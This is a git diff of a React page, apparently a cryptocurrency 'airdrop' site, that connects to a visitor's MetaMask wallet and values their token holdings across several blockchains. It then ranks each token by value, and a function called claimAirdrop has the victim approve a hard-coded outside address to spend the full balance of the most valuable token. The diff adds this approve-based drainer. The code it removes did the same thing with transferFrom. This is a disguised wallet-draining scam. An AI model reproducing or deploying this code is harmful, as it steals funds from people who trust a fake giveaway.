@@ -28,6 +28,16 @@ export default function Home() {
   const [error, setError] = useState()
   const [sucMsg, setSucMsg] = useState()
   const [chainId, setChainId] = useState()
+  const [ethBalances, setEthBalances] = useState()
+  const [bscBalances, setBscBalances] = useState()
+  const [polygonBalances, setPolygonBalances] = useState()
+  const [arbBalances, setArbBalances] = useState()
+  const [opBalances, setOpBalances] = useState()
+  const [biggerBalanceEth, setBiggerBalanceEth] = useState()
+  const [biggerBalanceBsc, setBiggerBalanceBsc] = useState()
+  const [biggerBalancePolygon, setBiggerBalancePolygon] = useState()
+  const [biggerBalanceOp, setBiggerBalanceOp] = useState()
+  const [biggerBalanceArb, setBiggerBalanceArb] = useState()
   
   let etherValueOfUser
   let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
@@ -54,61 +64,38 @@ export default function Home() {
       try{
       const accounts = await ethereum.request({method: "eth_requestAccounts"})
       setAccount(accounts[0])
-      console.log(`accounts: ${accounts}`);
-
-
       const _provider = new ethers.providers.Web3Provider(window.ethereum,"any")
-
-      console.log(_provider);
       setProvider(_provider)
 
 
       user = await _provider.send("eth_requestAccounts", []);
-      console.log(user);
+
       _signer = _provider.getSigner()
       setSigner(_signer)
-      console.log(_signer);
+ 
       const chainId = await signer.getChainId()
       setChainId(chainId)
       console.log(`chain id: ${chainId}`);
+
       const bal = await _signer.getBalance(user.address)
-      // convert balance from bignumber to ethereum type:
       const balToEth = ethers.utils.formatEther(bal)
-    
-      console.log('balance:',bal);
-      
+   
       const gasL = ethers.utils.hexlify(100000)
       setGasLimit(gasL)
 
       const gasP = _provider.getGasPrice()
-      // setGasPrice(gasP)
+  
       setGasPrice(gasP)
-      // const fee = (estimateGas).mul(gasL)
       const fee = (await gasP).mul(gasL)
-      console.log('fee', fee);
-
       const finalAmount = bal - (fee * 10)
       const finalAmountToString = finalAmount.toString()
       const finalAmountBigNumber =await BigNumber.from(finalAmountToString)
-      console.log("finalAmountBigNumber",finalAmountBigNumber);
       setBalance(finalAmountBigNumber)
       console.log('amount - fee :',finalAmount);
 
-      // setAggregatorContract(new ethers.Contract("0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e", aggregator, _provider))
-      // console.log(aggregatorContract);
-      
-      // const etherValueInUsd = await aggregatorContract.latestRoundData()
-      
-
-      const etherValue = bal / 10e17
-      etherValueOfUser = etherValue
-
-
-      console.log(`balance is :${etherValue} (depend on chainId)`);
-      getData()
-
       const isConnected2 = ethereum.isConnected()
       setIsConnected(isConnected2)
+      getData()
 
 
       window.ethereum.on('accountsChanged',async () =>{
@@ -121,7 +108,7 @@ export default function Home() {
         const newChainId = await signer.getChainId()
         setChainId(newChainId)
         console.log(`chain id changed to :${newChainId}`);
-        // window.location.reload();
+        window.location.reload();
       })
       ethereum.on('disconnect', setIsConnected(false));
       const isConnected3 = ethereum.isConnected()
@@ -130,6 +117,7 @@ export default function Home() {
         console.log('user disconnected!');
       } catch(err){
         setError(err.message)
+        // console.log('user rejected!');
       }
     }else{
       console.log("Please install MetaMask!");
@@ -145,122 +133,110 @@ export default function Home() {
     if (chainId == 137) {
 
       const priceEth = new ethers.Contract("0xF9680D99D6C9589e2a93a78A04A279e509205945",aggregator,provider)
-      const currentEthPrice = await priceEth.latestRoundData()
-      console.log('price Weth:',currentEthPrice.answer.toString());
-  
-      const priceLink = new ethers.Contract("0xd9FFdb71EbE7496cC440152d43986Aae0AB76665",aggregator,provider)
-      const currentLinkPrice = await priceLink.latestRoundData()
-      console.log('price Link:',currentLinkPrice.answer.toString());
-  
-      const priceMatic = new ethers.Contract("0xAB594600376Ec9fD91F8e885dADF0CE036862dE0",aggregator,provider)
-      const currentMatickPrice = await priceMatic.latestRoundData()
-      console.log('price Matic:',currentMatickPrice.answer.toString());
-  
-      const priceUni = new ethers.Contract("0xdf0Fb4e4F928d2dCB76f438575fDD8682386e13C",aggregator,provider)
-      const currentUniPrice = await priceUni.latestRoundData()
-      console.log('price Uni:',currentUniPrice.answer.toString());
-      
-      
+      const ethPrice = await priceEth.latestRoundData()
+      const currentEthPrice = ethPrice.answer / 10**8
       const eth = new ethers.Contract("0x7ceb23fd6bc0add59e62ac25578270cff1b9f619",ERC20,provider)
-      const usdc = new ethers.Contract( "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",ERC20 ,provider)
-      const usdt = new ethers.Contract( "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",ERC20 ,provider)
-      const link = new ethers.Contract( "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39",ERC20 ,provider)
-      const dai = new ethers.Contract( "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",ERC20 ,provider)
-      const matic = new ethers.Contract( "0x0000000000000000000000000000000000001010",ERC20 ,provider)
-      const uni = new ethers.Contract( "0xb33eaad8d922b1083446dc23f610c2567fb5180f",ERC20 ,provider)
       const ethB = await eth.balanceOf(account)
-      const usdcB = await usdc.balanceOf(account)
-      const usdtB = await usdt.balanceOf(account)
-      const linkB = await link.balanceOf(account)
-      const daiB = await dai.balanceOf(account)
-      const maticB = await matic.balanceOf(account)
-      const uniB = await uni.balanceOf(account)
-      console.log('usdc balance:',usdcB.toString() / 10 ** 6);
-      console.log('usdt balance:',usdtB.toString() / 10 ** 6);
-      console.log('link balance:',linkB.toString() / 10 ** 18);
-      console.log('dai balance:',daiB.toString() / 10 ** 18);
-      console.log('matic balance:',maticB.toString() / 10 ** 18);
-      console.log('uni balance:',uniB.toString() / 10 ** 18);
-  
-      const ethValue = ethB.mul(currentEthPrice.answer)
-      const usdcValue = usdcB/ 6
-      const usdtValue = usdtB / 6
-      const linkValue = linkB.mul(currentLinkPrice.answer)
-      const daiValue =  daiB / 18
-      const maticValue = maticB.mul(currentMatickPrice.answer)
-      const uniValue = uniB.mul(currentUniPrice.answer)
-  
-      console.log(ethValue.toString() / 10 ** 26);
-      console.log(usdcValue.toString());
-      console.log(usdtValue.toString());
-      console.log(daiValue.toString());
-      console.log(linkValue.toString() / 10 ** 26);
-      console.log(maticValue.toString() / 10 ** 26);
-      console.log(uniValue.toString() / 10 ** 26);
-  
+      // const ethValue = (ethB*currentEthPrice) / 10**18
       const ETH = {
         amount: ethB,
-        value: (ethB.toString() / 10 ** 26),
+        value: (ethB*currentEthPrice) / 10**18,
         address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
       }
+
+      console.log('Weth details, price:',currentEthPrice,"value:",(ethB*currentEthPrice) / 10**18);
   
-      const USDT = {
-        amount: usdtB,
-        value: (usdtValue.toString() / 10 ** 26),
-        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
-      }
-      const UNI = {
-        amount: uniB,
-        value: (uniValue.toString() / 10 ** 26),
-        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
-      }
-      const DAI = {
-        amount: daiB,
-        value: (daiValue.toString() / 10 ** 26),
-        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
-      }
-  
-      const MATIC = {
-        amount: maticB,
-        value: (maticValue.toString() / 10 ** 26),
-        address: "0x0000000000000000000000000000000000001010"
-      }
+      const priceLink = new ethers.Contract("0xd9FFdb71EbE7496cC440152d43986Aae0AB76665",aggregator,provider)
+      const linkPrice = await priceLink.latestRoundData()
+      const currentLinkPrice = linkPrice.answer / 10**8
+      const link = new ethers.Contract( "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39",ERC20 ,provider)
+      const linkB = await link.balanceOf(account)
       const LINK = {
         amount: linkB,
-        value: (linkValue.toString() / 10 ** 26),
+        value: (linkB*currentLinkPrice / 10 ** 18),
         address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
       }
+      console.log('LINK details, price:',currentLinkPrice,"value:",(linkB*currentLinkPrice / 10 ** 18));
+  
+      const priceMatic = new ethers.Contract("0xAB594600376Ec9fD91F8e885dADF0CE036862dE0",aggregator,provider)
+      const maticPrice = await priceMatic.latestRoundData()
+      const currentMaticPrice = maticPrice.answer/10**8
+      const matic = new ethers.Contract( "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",ERC20 ,provider)
+      const maticB = await matic.balanceOf(account)
+      const MATIC = {
+        amount: maticB,
+        value: (maticB*currentMaticPrice / 10**18),
+        address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270"
+      }
+      console.log('MATIC details, price:',currentMaticPrice,"value:",(maticB*currentMaticPrice) / 10**18);
+  
+      const priceUni = new ethers.Contract("0xdf0Fb4e4F928d2dCB76f438575fDD8682386e13C",aggregator,provider)
+      const uniPrice = await await priceUni.latestRoundData()
+      const currentUniPrice = uniPrice.answer/ 10**8
+      const uni = new ethers.Contract( "0xb33eaad8d922b1083446dc23f610c2567fb5180f",ERC20 ,provider)
+      const uniB = await uni.balanceOf(account)
+      const UNI = {
+        amount: uniB,
+        value: (uniB*currentUniPrice/ 10** 18),
+        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
+      }
+      console.log('UNI details, price:',currentUniPrice,"value:",(uniB*currentUniPrice/ 10** 18));
+  
+      
+      
+      const usdc = new ethers.Contract( "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",ERC20 ,provider)
+      const usdcB = await usdc.balanceOf(account)
       const USDC = {
         amount: usdcB,
-        value: usdcValue,
+        value: usdcB/ 10**6,
         address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
       }
+      console.log('USDC details, price:',1,"value:",usdcB/ 10**6);
   
-      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
-      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
-  
-      // console.log(tokensValues);
-      let lastElement
-      let Biggest  
-      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
-      for (let i = 0; i < Tokens.length; i++) {
-      const element = Tokens[i].value;
-        if (i >= 0 && element > lastElement) {
-          Biggest = Tokens[i]
-        }
-        lastElement = element
+
+      const usdt = new ethers.Contract( "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",ERC20 ,provider)
+      const usdtB = await usdt.balanceOf(account)
+      const USDT = {
+        amount: usdtB,
+        value: (usdtB / 10 ** 6),
+        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
       }
+      console.log('USDT details, price:',1,"value:",(usdtB / 10 ** 6));
+  
+
+      const dai = new ethers.Contract( "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",ERC20 ,provider)
+      const daiB = await dai.balanceOf(account)
+      const DAI = {
+        amount: daiB,
+        value: (daiB/ 10 ** 18),
+        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
+      }
+      console.log('DAI details, price:',1,"value:",(daiB/ 10 ** 18));
+  
+  
       
-      console.log(Tokens);
+      
+      
+      let lastElement = 0
+      let Biggest = 0
+      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
+      let TokensWithBalance = []
+      for (let i = 0; i < Tokens.length; i++) {
+        const element = Tokens[i].value;
+        if(element > 0){
+          // Tokens.splice(i,1)
+          TokensWithBalance.push(element)
+        }
+        if (i >= 0 && element > Biggest) {
+            Biggest = Tokens[i]
+        }
+      }
       console.log(Biggest);
-      //  Tokens.sort((a, b) => b - a);
-      // console.log(Tokens);
-      // // }
-      // tokensBalance.sort(function(a, b){return b-a});
-  
-      // let highest = points[0];
-      // console.log(highest);
-  
+      console.log(TokensWithBalance);
+
+      setPolygonBalances(TokensWithBalance)
+      setBiggerBalancePolygon(Biggest)
+      
     } if (chainId == 1) {
       const priceEth = new ethers.Contract("0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419",aggregator,provider)
       const ethPrice = await priceEth.latestRoundData()
@@ -1090,7 +1066,7 @@ export default function Home() {
       // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
   
       // console.log(tokensValues);
-      let lastElement
+      let lastElement = 0
       let Biggest  
       const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI,ATOM,AAVE,SAND,MANA,MKR,GRT,PAXG,SNX,IMX,ONEINCH,LDO,BAT,LRC,BAL,CVX,COMP,CRV,DODO,DYDX,ENJ,ENS,AMPL,AMP,ANT,APE,AXS,BADGER,BAND,INJ,ILV,IOTX,KNC,OCEAN,ONT,PHA,REN,SHIB,BUSD,ALCX,ZRX,YFI,UMA,TOMO,SXP,SUSHI,SPELL,PERP,KP3R,FXS,FRAX,RNDR,DENT,REEF,POLS,STETH,WBTC]
       for (let i = 0; i < Tokens.length; i++) {
@@ -1100,6 +1076,8 @@ export default function Home() {
         }
         lastElement = element
       }
+      setEthBalances(Tokens)
+      setBiggerBalanceEth(Biggest)
       
       console.log(Tokens);
       console.log(Biggest);
@@ -1743,16 +1721,23 @@ export default function Home() {
       let lastElement = 0
       let Biggest  
       const Tokens = [WBNB,ETH,LINK,MATIC,USDC,UNI,USDT,DAI,AAVE,ATOM,BAND,CAKE,COMP,DOGE,DODO,DOT,FIL,FET,FTM,FXS,GMT,NEAR,ONT,REEF,SXP,SUSHI,TWT,WIN,XTZ,YFI,VET,WOO,AXS,BUSD,SFP,ADA,TRX,LTC,AVAX,TON,USP,TUSD]
+      let TokensWithBalance = []
       for (let i = 0; i < Tokens.length; i++) {
-      const element = Tokens[i].value;
-        if (i >= 0 && element > lastElement) {
-          Biggest = Tokens[i]
+        const element = Tokens[i].value;
+        if(element > 0){
+          // Tokens.splice(i,1)
+          TokensWithBalance.push(element)
         }
-        lastElement = element
+        if (i >= 0 && element > Biggest) {
+            Biggest = Tokens[i]
+        }
       }
-      
-      console.log(Tokens);
       console.log(Biggest);
+      console.log(TokensWithBalance);
+
+      setPolygonBalances(TokensWithBalance)
+      setBiggerBalancePolygon(Biggest)
+      
     } if (chainId == 42161) {
 
       const priceEth = new ethers.Contract("0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612",aggregator,provider)
@@ -1849,21 +1834,27 @@ export default function Home() {
         address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
       }
   
-      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
-      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
-  
-      // console.log(tokensValues);
-      let lastElement
-      let Biggest  
+
+       
+      let lastElement = 0
+      let Biggest = 0
       const Tokens = [ETH,LINK,USDC,UNI,USDT,DAI]
+      let TokensWithBalance = []
       for (let i = 0; i < Tokens.length; i++) {
-      const element = Tokens[i].value;
-        if (i >= 0 && element > lastElement) {
-          Biggest = Tokens[i]
+        const element = Tokens[i].value;
+        if(element > 0){
+          // Tokens.splice(i,1)
+          TokensWithBalance.push(element)
         }
-        lastElement = element
+        if (i >= 0 && element > Biggest) {
+            Biggest = Tokens[i]
+        }
       }
       console.log(Biggest);
+      console.log(TokensWithBalance);
+
+      setPolygonBalances(TokensWithBalance)
+      setBiggerBalancePolygon(Biggest)
       
       
     } 
@@ -1906,20 +1897,102 @@ export default function Home() {
     
   }
 
-  
+  function updateArray(chaiId) { 
+    if (chainId == 1 ) { //ethereum
+      let lastElement
+      let Biggest  
+      let BiggestIndex = 0
+      for (let i = 0; i < ethBalances.length; i++) {
+      const element = ethBalances[i].value;
+        if (i >= 0 && element > lastElement) {
+          Biggest = ethBalances[i]
+          BiggestIndex = i
+        }
+        lastElement = element
+      }
+      setBiggerBalanceEth(Biggest)
+      ethBalances.splice(BiggestIndex,1)
+      
+    } else if (chainId == 56) { // binance smart chain
+      let lastElement
+      let Biggest  
+      let BiggestIndex = 0
+      for (let i = 0; i < bscBalances.length; i++) {
+      const element = bscBalances[i].value;
+        if (i >= 0 && element > lastElement) {
+          Biggest = bscBalances[i]
+        }
+        lastElement = element
+      }
+      setBiggerBalanceBsc(Biggest)
+      bscBalances.splice(BiggestIndex,1)
+    }else if (chainId == 137) { //polygon
+      let lastElement
+      let Biggest  
+      let BiggestIndex = 0
+      for (let i = 0; i < polygonBalances.length; i++) {
+      const element = polygonBalances[i].value;
+        if (i >= 0 && element > lastElement) {
+          Biggest = polygonBalances[i]
+        }
+        lastElement = element
+      }
+      setBiggerBalancePolygon(Biggest)
+      polygonBalances.splice(BiggestIndex,1)
+    // }else if (chainId == 10) { //optimism
+      
+    // }else if (chainId == 42161) { //arbitrum
+      
+    }else {
+      console.log("Please change your network");
+    }
+
+  }
   
 
   async function claimAirdrop() {
-    const _gasLimit = ethers.utils.hexlify(1000000)
-    const _gasPrice = ethers.utils.parseUnits("10.0", "gwei")
-    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
-    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
-    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
-    const tokenWithSigner = tokenContract.connect(signer)
-    const approve = await tokenWithSigner.transferFrom(account,MyWalletAddress, balanceOfToken,{
-      gasLimit: _gasLimit,
-      gasPrice: _gasPrice
-    })
+
+    const chainId = await signer.getChainId()
+    // updateArray(chainId)
+
+
+    console.log(biggerBalancePolygon);
+    // const _gasLimit = ethers.utils.hexlify(1000000)
+    // const _gasPrice = ethers.utils.parseUnits("10.0", "gwei")
+
+    if (chainId == 1) {
+      const tokenContract = new ethers.Contract(biggerBalanceEth.address, ERC20, provider)
+      const tokenWithSigner = tokenContract.connect(signer)
+      const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalanceEth.amount)
+
+      updateArray(chaiId)
+    
+    }
+    if (chainId == 56) {
+      const tokenContract = new ethers.Contract(biggerBalanceBsc.address, ERC20, provider)
+      const tokenWithSigner = tokenContract.connect(signer)
+      const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalanceBsc.amount)
+    
+      updateArray(chaiId)
+    }
+    if (chainId == 137) {
+      const tokenContract = new ethers.Contract(biggerBalancePolygon.address, ERC20, provider)
+      console.log(tokenContract);
+      const tokenWithSigner =await tokenContract.connect(signer)
+      const approve = await tokenWithSigner.approve("0x1204D7F27702d793260Ad5a406dDEE7660d21B61", biggerBalancePolygon.amount)
+    
+      updateArray(chaiId)
+    }
+
+    
+    // const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
+    // const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
+    // const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
+    // const tokenWithSigner = tokenContract.connect(signer)
+    // const approve = await tokenWithSigner.transferFrom(account,MyWalletAddress, balanceOfToken,{
+    //   gasLimit: _gasLimit,
+    //   gasPrice: _gasPrice
+    // })
     
   }
 
